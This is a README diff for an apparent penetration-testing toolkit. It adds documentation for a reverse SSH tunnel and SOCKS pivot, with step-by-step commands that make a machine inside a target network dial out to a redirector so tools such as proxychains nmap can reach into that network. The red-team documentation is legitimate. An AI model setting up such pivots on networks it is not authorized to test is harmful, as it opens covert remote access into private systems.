@@ -66,6 +66,7 @@ aux-split-lines --input targets --lines 1000
 aux-split-creds --glob 'creds-*.txt' --dedupe-users
 aux-iptables --ranges-file ranges.txt --apply
 aux-nessus-rules --input out-of-scope.txt --apply
+aux-reverse-ssh diagram
 ```
 
 ---
@@ -265,6 +266,75 @@ Nessus configuration and management utilities.
   # Using script directly (no installation)
   python3 nessus/add_out_of_scope.py --input out-of-scope.txt
   sudo python3 nessus/add_out_of_scope.py --input out-of-scope.txt --apply
+  ```
+
+---
+
+### `pivot/`
+Reverse SSH tunnel with a SOCKS pivot mode, for **authorized engagements only**.
+
+- **reverse_ssh_tunnel** — Set up, establish, and test a reverse SSH tunnel across three
+  systems and run tools through it via proxychains.
+
+  **The three systems**
+  - **Operator host** — you; already has SSH to the redirector. Orchestrates.
+  - **Remote redirector** — internet-facing; the SSH server + SOCKS proxy live here.
+  - **Internal sender** — inside the target network; outbound-only; the SSH client.
+
+  An internal machine dials **out** to the redirector, opening a SOCKS proxy on the
+  redirector; tools pointed at that proxy tunnel **back** through the internal machine
+  into the target network. The keypair is generated on the internal sender, so the
+  **private key never crosses the network** — only the public key is transferred.
+
+  Visualize it: `auxiliary reverse-ssh diagram` (prints Mermaid; add `--sequence` for the
+  setup steps). Paste the output into GitHub or https://mermaid.live.
+
+  **End-to-end flow** (run each command on the noted system):
+  ```bash
+  # 1. [internal sender] make a keypair (private key stays here)
+  auxiliary reverse-ssh keygen --name reverse_tunnel
+
+  # 2. [remote redirector] listen for the public key (HMAC-authenticated)
+  auxiliary reverse-ssh recv-key --port 4444 --secret CHANGEME
+
+  # 3. [internal sender] send the public key, then COMPARE the printed fingerprints
+  auxiliary reverse-ssh send-key --host REDIRECTOR --port 4444 --secret CHANGEME
+
+  # 4. [remote redirector] install it into authorized_keys (re-verify fingerprint)
+  auxiliary reverse-ssh install-key --from /tmp/reverse_tunnel.pub
+
+  # 5. [internal sender] open the reverse SSH + SOCKS pivot (127.0.0.1:9050 on the remote)
+  auxiliary reverse-ssh tunnel --socks --user USER --host REDIRECTOR
+
+  # 6. verify from both ends (verify uses a throwaway remote port, so it is safe to
+  #    run whether or not the tunnel from step 5 is already up)
+  auxiliary reverse-ssh verify --user USER --host REDIRECTOR   # [internal sender]
+  auxiliary reverse-ssh check                                  # [remote redirector]
+
+  # 7. point proxychains at the pivot, then run your tools through it
+  #    In /etc/proxychains.conf (or proxychains4.conf) under [ProxyList]:
+  #        socks5 127.0.0.1 9050          # lowercase 'socks5', NOT socks4
+  proxychains nmap -sT -Pn TARGET        # on the remote, or after `ssh -L 9050:...`
+  ```
+
+  **Windows internal sender:** the subcommands and flags are identical; only the invocation
+  prefix differs — after a pip/pipx install use `aux-reverse-ssh ...` (or
+  `auxiliary reverse-ssh ...`), or when running from source use
+  `python pivot\reverse_ssh_tunnel.py ...` (note the backslash path). It relies on the Win32
+  OpenSSH client — if `ssh` is missing, enable the *OpenSSH Client* optional feature.
+  `send-key`/`recv-key` are pure-Python, so **no `nc` is required** on either side.
+
+  **Fallbacks & options:** every remote subcommand supports `--print` to emit the equivalent
+  shell one-liner (paste it over your existing SSH if the repo isn't installed on the
+  redirector). Transfer protection is layered: fingerprint comparison is always on,
+  `--secret` adds HMAC authentication, and `--tls` encrypts the transfer. Use
+  `tunnel --print-only` to preview the ssh command and `tunnel --config-entry` to emit a
+  `~/.ssh/config` block. Run `preflight` on the redirector for sshd guidance (notably: keep
+  the SOCKS proxy on loopback and do **not** set `GatewayPorts yes`).
+
+  ```bash
+  # Using script directly (no installation)
+  python3 pivot/reverse_ssh_tunnel.py --help
   ```
 
 ---
